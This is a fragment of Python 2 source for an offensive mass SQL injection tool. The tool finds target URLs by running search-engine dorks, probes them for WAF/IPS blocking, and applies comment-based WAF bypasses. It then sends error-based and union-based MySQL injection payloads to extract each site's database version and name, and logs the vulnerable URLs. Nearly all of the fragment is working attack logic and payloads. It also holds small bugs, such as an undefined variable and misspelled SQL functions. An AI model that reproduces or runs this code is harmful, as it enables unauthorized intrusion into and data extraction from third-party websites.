                    print colored("[*] Simple security detection ... ", 'cyan')
                    burl = eurl
                    burl = nodata_stress(eurl, s_SQLi)
                    burl += "1984 AND CONCAT(CHAR(088,071,068,079,082,075,013,010))"

                    req = requests.get(burl, headers=headers, timeout=i_timeout)
                    data = req.text.encode('utf-8')

                    if (data.find("Mod_Security") != -1 or data.find("You don't have permission ") != -1 or data.find("Security Incident Detected") != -1 or data.find("Your request was blocked") != -1 or data.find("suspicious") != -1 or data.find("blocked") != -1 or data.find("Request denied") != -1):
                        print colored("[!] URL protected by a [WAF/IPS/IDS] or/and other security !!! ", 'red')
                        waf = 1
                #--- mode bp  ---    
                    if (waf == 1):       
                        burl += " --"
                        burl = sbws(burl, 1)
                        print ("DEBUG SBWS -> "+burl)
                        req = requests.get(burl, headers=headers, timeout=i_timeout)
                        data = req.text.encode('utf-8')

                        if (waf == 1 and data.find("Mod_Security") != -1 or data.find("You don't have permission ") != -1 or data.find("Security Incident Detected") != -1 or data.find("Your request was blocked") != -1 or data.find("suspicious") != -1 or data.find("blocked") != -1 or data.find("Request denied") != -1):
                            burl = eurl
                            burl = nodata_stress(eurl, s_SQLi)
                            burl += "1984 AND CONCAT(CHAR(088,071,068,079,082,075,013,010)) --"
                            burl = sbws(burl, 2)
                            print ("DEBUG SBWS 2 -> "+burl)
                            req = requests.get(burl, headers=headers, timeout=i_timeout)
                            data = req.text.encode('utf-8')
                        
                            if (waf == 1 and data.find("Mod_Security") != -1 or data.find("You don't have permission ") != -1 or data.find("Security Incident Detected") != -1 or data.find("Your request was blocked") != -1 or data.find("suspicious") != -1 or data.find("blocked") != -1 or data.find("Request denied") != -1):
                                print colored ("[-] Simple Bypass failed ! (1=/*!50000data*/ 2=%2f**%2f%2f**%2fdata%2f**%2f%2f**%2f)", 'red')
                            else:
                                print colored ("[*] Simple Bypass work ! (2=%2f**%2f%2f**%2fdata%2f**%2f%2f**%2f)", 'green')
                                mode_bp = 2
                        else:
                            print colored("[*] Simple Bypass work ! (1=/*!50000data*/)", 'green')
                            mode_bp = 1
                #------

            # ------ ------ ------            
            # ------ QUOTES ------
                print colored("[*] Stress URL ", 'cyan')
                burl = eurl
                burl += "%%2727"

                if (i_debug == 1):
                    print ("burl -> "+burl)
            

                req = requests.get(burl, headers=headers, timeout=i_timeout)           
                data = req.text.encode('utf-8')
    
                while (y < size_ST):
                    if (data.find(SQLi_trace[y]) != -1):
                        terms.append(SQLi_trace[y])
                        if (i_debug == 1):
                            print ("vulnerable test -> "+burl+" / "+str(SQLi_trace[y]))
                    y += 1
            
                burl = nodata_stress(eurl, s_SQLi)
                burl += "o;"
                if (i_debug == 1):
                    print ("URL -> "+burl)
            
                req = requests.get(burl, headers=headers, timeout=i_timeout)
                data = req.text.encode('utf-8')
                y = 0

                while (y < size_ST):
                    if (data.find(SQLi_trace[y]) != -1):
                        terms.append(SQLi_trace[y])
                        if (i_debug == 1):
                            print ("vulnerable test -> "+burl+" / "+str(SQLi_trace[y]))
                    y += 1


                terms = list(set(terms))
                level = (len(terms)*3)
                if (len(terms) == 0):
                    print colored("[!] URL is insignificant to stress ", 'red')
                else:
                    print colored("[!] Stress works on URL ", 'green')

            # ------ ------ ------
            # ------ Forcing / Dump -------
                if (mode_sqli == "Full" or mode_sqli == "full" or mode_sqli == 'f'):
                    print colored("[*] Forcing URL" , 'cyan') 
                    burl = nodata_stress(eurl, s_SQLi)
                    burl += "-300 UNION SELECT "+str(turing_rangeUS(300, 155, "database()"))+" --"

                    if (waf == 1):
                        burl = sbws(burl, mode_bp)

                    req = requests.get(burl, headers=headers, timeout=i_timeout)
                    data = req.text.encode('utf-8')

                    if (data.find("The used SELECT statements ") != -1 or data.find("different number of columns") != -1):
                        print colored("[!] This technique is potentially feasible   - ERROR-BASED -", 'green')
                        level += 10
                        dump = 1

                    burl = nodata_stress(eurl, s_SQLi)
                    burl += "10000 ORDER BY 10000 --"

                    if (waf == 1):
                        burl = sbws(burl, mode_bp)

                    req = requests.get(burl, headers=headers, timeout=i_timeout)
                    data = req.text.encode('utf-8')

                    if (data.find("Unknown column '") != -1 or data.find("' in 'order clause'") != -1 or data.find("mysql_num_rows():") != -1 or data.find("mysql_num_row():") != -1):
                        print colored("[!] This technique is potentially feasible   - UNION-BASED -", 'green')
                        level += 10

            # ------ BRUTAL DUMP ------
                    if (dump == 1):
                        print colored("[*] Brutal Dump", 'cyan')
                        # DUMP 1 S
                        burl = nodata_stress(eurl, s_SQLi)
                        burl += "1 OR 1984 GROUP BY CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,floor(rand(0)*2)) HAVING MIN(0) OR 1 --"
                
                        if (waf == 1):
                            burl = sbws(burl, mode_bp)
                        if (i_debug == 1):
                            print ("DEBUG Payload 1 -> "+burl)
                        req = requests.get(burl, headers=headers, timeout=i_timeout)
                        data = req.text.encode('utf-8')
                
                        # DUMP 2 S
                        if (data.find("(^#^)") == -1):
                            dump = 20
                            burl = nodata_stress(eurl, s_SQLi)
                            burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FL0OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"

                            if (waf == 1):
                                burl = sbws(burl, mode_bp)
                            if (i_debug == 1):
                                print ("DEBUG Payload 2 -> "+burl)
                            req = requests.get(burl, headers=headers, timeout=i_timeout)
                            data = req.text.encode('utf-8')
                            # DUMP 3 S
                            if (data.find("(^#^)") == -1):
                                dump = 30

                                burl = nodata_stress(eurl, s_SQLi)
                                burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"

                                if (waf == 1):
                                    burl = sbws(burl, mode_bp)
                                if (i_debug == 1):
                                    print ("DEBUG Payload 3 -> "+burl)
                                req = requests.get(burl, headers=headers, timeout=i_timeout)
                                data = req.text.encode()

                                # DUMP 4 S
                                if (data.find("(^#^)") == -1):
                                    dump = 40

                                    burl = nodata_stress(eurl, s_SQLi)
                                    burl += "UPDATEXML(RAND()%2c(SELECT UNHEX(HEX(CONCAT(0x28,0x5e,0x23,0x5e,0x29,0x7e%2cversion()%2c0x7e,0x28,0x56,0x23,0x56,0x29))))%2c0) --"
                    
                                    if (waf == 1):
                                        burl = sbws(burl, mod_bp)
                                    if (i_debug == 1):
                                        print ("DEBUG Payload 4 -> "+burl)
                                    req = requests.get(burl, headers=headers, timeout=i_timeout)
                                    data = req.text.encode('utf-8')

                                    if (data.find("(^#^)") == -1):
                                        print colored("[!] Brutal Dump failed ! ", 'red')
                                        nodump = 1
                                
                                    elif (dump == 40 and data.find("(^#^)")):
                                        tmp_version = dump_data(data)
                                        burl = nodata_stress(eurl, s_SQLi)
                                        burl += "UPDATEXML(RAND()%2c(SELECT UNHEX(HEX(CONCAT(0x28,0x5e,0x23,0x5e,0x29,0x7e%2cdatabase()%2c0x7e,0x28,0x56,0x23,0x56,0x29))))%2c0) --"
                                        if (waf == 1):
                                            sbws(burl, mod_bp)
                                        req = requests.get(burl, headers=headers, timeout=i_timeout)
                                        data = req.text.encode('utf-8')
                                        tmp_database = dump_data(data)
                                        if (i_debug):
                                            print ("debug BD 4 VERSION & DATABASE -> "+tmp_version+" "+tmp_database)
                                        print colored("[*] Infos obtained brutally:", 'green')
                                        print colored("     # [Version]  : "+tmp_version, 'yellow')
                                        print colored("     # [Database] : "+tmp_database, 'yellow')
                                        print colored("     # [Payload]  : "+burl, 'yellow')
                                    # DUMP 4 E

                            elif (dump == 30):
                                tmp_version = dump_data(data)
                                burl = nodata_stress(eurl, s_SQLi)
                                burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                                if (waf == 1):
                                    burl = sbws(burl, mode_bp)
                                req = requests.get(burl, headers=headers, timeout=i_timeout)
                                data = req.text.encode('utf-8')
                                tmp_database = dump_data(data)
                                if (i_debug):
                                    print ("debug BD 3 VERSION & DATABASE -> "+tmp_version+" "+tmp_database)
                                print colored("[*] Infos obtained brutally:", 'green')
                                print colored("     # [Version]  : "+tmp_version, 'yellow')
                                print colored("     # [Database] : "+tmp_database, 'yellow')
                                print colored("     # [Payload]  : "+burl, 'yellow')

                            # DUMP 3 E
                        elif (dump == 20):
                            tmp_version = dump_data(data)
                            burl = nodata_stress(eurl, s_SQLi)
                            burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FL0OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                            if (waf == 1):
                                burl = sbws(burl, mode_bp)
                            req = requests.get(burl, headers=headers, timeout=i_timeout)
                            data = req.text.encode('utf-8')
                            tmp_database = dump_data(data)
                            if (i_debug == 1):
                                print ("debug BD 2 VERSION & DATABASE -> "+tmp_version+" "+tmp_database)
                            print colored("[*] Infos obtained brutally:", 'green')
                            print colored("     # [Version]  : "+tmp_version, 'yellow')
                            print colored("     # [Database] : "+tmp_database, 'yellow')
                            print colored("     # [Payload]  : "+burl, 'yellow')

                        # DUMP 2 E

                        if (dump == 1):
                            tmp_version = dump_data(data)
                            burl = nodata_stress(eurl, s_SQLi)
                            burl += "1 OR 1984 GROUP BY CONCAT(0x28,0x5e,0x23,0x5e,0x29,dabatase(),0x28,0x56,0x23,0x56,0x29,floor(rand(0)*2)) HAVING MIN(0) OR 1 --"
                            if (waf == 1):
                                burl = sbws(burl, mode_bp)
                            req = requests.get(burl, headers=headers, timeout=i_timeout)
                            data = req.text.encode('utf-8')

                            tmp_database = dump_data(data)
                            if (i_debug == 1):
                                print ("debug BD 1 VERSION & DATABASE -> "+tmp_version+" "+tmp_database)
                            print colored("[*] Infos obtained brutally:", 'green')
                            print colored("     # [Version]  : "+tmp_version, 'yellow')
                            print colored("     # [Database] : "+tmp_database, 'yellow')
                            print colored("     # [Payload]  : "+burl, 'yellow')
                        # DUMP 1 E

            #------ ------ ------            

                if (level > 0):
                    print colored("[!] vulnerable URL [!]", 'green')
                    print colored("       Parser LvL: "+str(level), 'cyan')
                    terms = list(set(terms))
                    if (i_debug == 1):
                        print ("Terms found -> : "+str(terms))
                    urlsvulnerable.append(eurl)
                    print colored("       term(s) found overview : "+str(terms).replace('[', '').replace(']', '').replace(',', ' '), 'green')

                if (len(terms) == 0):
                    print colored("Grrr ...Marvin is not happy :( ", 'red')
                print ('\n')
         
                i += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                i += 1
            except requests.exceptions.TooManyRedirects:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                i += 1
            except requests.exceptions.ReadTimeout:
                print colored("[-] Request Timeout, ignored ... \n", 'cyan')
                i += 1
            except requests.exceptions.InvalidSchema:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                i += 1

        return list(urlsvulnerable)




def     rand_dork ():

        agent_file = open('xdorks.txt', 'r')
        size = int(len(agent_file.readlines())-1)
        rnd_n = randint(5, size)
        agent_file.close()
        agent_file = open('xdorks.txt', 'r')
        user_agent = str(agent_file.readlines()[rnd_n])
        agent_file.close()
        user_agent = user_agent.replace('\n', '')

        return user_agent




def     virax_search_engine (s_dork, i_npage, i_debug, s_SQLi, s_outfile, i_timeout, l_addurls, i_co_on, i_mores, mode_sqli, s_oneurl):

        i = 0
        urls = []
        
        if (len(l_addurls) == 0 and s_oneurl == ""):
            #urls = list(set(lilo_search_engine(s_dork, i_npage, i_debug, 0)))
            if (i_mores == 1):
                print colored("--- LILO ---", attrs=['reverse', 'blink', 'bold'])
            urls = lilo_search_engine(s_dork, i_npage, i_debug, 0)
            if (i_mores == 1):
                print colored("\n--- STARTPAGE ---", attrs=['reverse', 'blink', 'bold'])
                urls += startpage_search_engine(s_dork, i_npage, i_debug, 0)
                print colored("\n--- SEARCHX 1---", attrs=['reverse', 'blink', 'bold'])
                urls += searchx_engine(s_dork, i_npage, i_debug, 0)
                print colored("\n--- SEARCHX 2---", attrs=['reverse', 'blink', 'bold'])
                urls += searchx2_engine(s_dork, i_npage, i_debug, 0)
                print colored("\n--- SEARCHX 3---", attrs=['reverse', 'blink', 'bold'])
                urls += searchx3_engine(s_dork, i_npage, i_debug, 0)
                print colored("\n--- SEARCHX 4---", attrs=['reverse', 'blink', 'bold'])
                urls += searchx4_engine(s_dork, i_npage, i_debug, 0)
                print colored("\n--- SEARCHX 5---", attrs=['reverse', 'blink', 'bold'])
                urls += searchx5_engine(s_dork, i_npage, i_debug, 0)
                print colored("\n--- SEARCHX 6---", attrs=['reverse', 'blink', 'bold'])
                urls += searchx6_engine(s_dork, i_npage, i_debug, 0)
                print colored("\n--- BING ---", attrs=['reverse', 'blink', 'bold'])
                urls += bing_search_engine(s_dork, i_npage, i_debug, 0)

            urls = list(set(urls))

            if (i_debug == 1):
                print ("--- concatenated and sorted lists ---> ")
                print (urls)

            file_txt = open('urlsfilter.txt', 'r')
            filter_list = file_txt.readlines()
            file_txt.close()          

            filter_list = [element.replace('\n', '') for element in filter_list]
        
            if (i_debug == 1):
                print ("no filtered urls ---> ")
                print (urls)

            urls = urlslist_filter(urls, filter_list)

            if (i_debug == 1):
                print ("filtered urls ---> ")
                print (urls)
        
            if (s_SQLi != ""):
                if (i_debug == 1):
                    print ("urls no focpa ---> ")
                    print (urls)

                urls = focpa(urls, s_SQLi)

                if (i_debug == 1):
                    print ("urls focpa ---> ")
                    print (urls)

            print colored("\n___ Urls Found "+str(len(urls))+" save in ["+s_outfile+"-URLS_FOUND] ___", 'cyan')
        
            if (s_outfile != ""):
                listofile(urls, s_outfile, s_dork, 1, i_co_on)

            if (s_SQLi != "" and i_timeout != 0):
                urls_vulnerable = []
                urls_vulnerable = GPP_Marvin(urls, s_SQLi, i_debug, i_timeout, mode_sqli)

                if (s_SQLi != "" and len(urls_vulnerable) != 0):
                    listofile(list(urls_vulnerable), s_outfile, s_dork, 2, i_co_on)
                    print colored("\n\n___ Urls Found "+str(len(urls_vulnerable))+" save in ["+s_outfile+"-URLS_VULNERABLE] ___", 'cyan')
                    print colored("[!] You made Marvin happy, congratulations ! ", 'green')
                    print colored("[!] Check if they are not fake positive ! \n\n", 'red')

                else:
                    print colored("[!] the list is empty, Marvin goes back to his depression ! \n\n", 'red')

            elif (s_SQLi != "" and i_timeout == 0):
                print colored("[!] Error, You must set a timeout with SQLi e,g: --timeout 6 or -t 6", 'red')
                exit()
            else:
                print colored("[!] Your research is carried out, but Marvin would have liked you to use the ('--SQLi' and '--timeout') options", 'green')

        elif (l_addurls != 0 and s_oneurl == "" and s_SQLi != "" and i_timeout != 0):
            file_txt = open('urlsfilter.txt', 'r')
            filter_list = file_txt.readlines()
            file_txt.close()
            filter_list = [element.replace('\n', '') for element in filter_list]
            l_addurls = urlslist_filter(l_addurls, filter_list)

            urls_vulnerable = []
            urls_vulnerable = GPP_Marvin(l_addurls, s_SQLi, i_debug, i_timeout, mode_sqli)

            if (s_SQLi != "" and len(urls_vulnerable) != 0):
                listofile(list(urls_vulnerable), s_outfile, s_dork, 2, i_co_on)
                print colored("\n\n___ Urls Found "+str(len(urls_vulnerable))+" save in ["+s_outfile+"-URLS_VULNERABLE] ___", 'cyan')
                print colored("[!] You made Marvin happy, congratulations ! ", 'green')
                print colored("[!] Check if they are not fake positive ! \n\n", 'red')

            else:
                print colored("[!] the list is empty, Marvin goes back to his depression ! \n\n", 'red')

        elif (s_oneurl != "" and s_SQLi != "" and i_timeout != 0):
            url_vulnerable = []
            url_vulnerable.append(s_oneurl)
            url_vulnerable = GPP_Marvin(url_vulnerable, s_SQLi, i_debug, i_timeout, mode_sqli)
            if (len(url_vulnerable) != 0):
                print colored("[!] You made Marvin happy, congratulations ! ", 'green')
                print colored("[!] Check if they are not fake positive ! \n\n", 'red')

            else:
                print colored("[!] the url is not vulnerable, Marvin goes back to his depression ! \n\n", 'red')


              
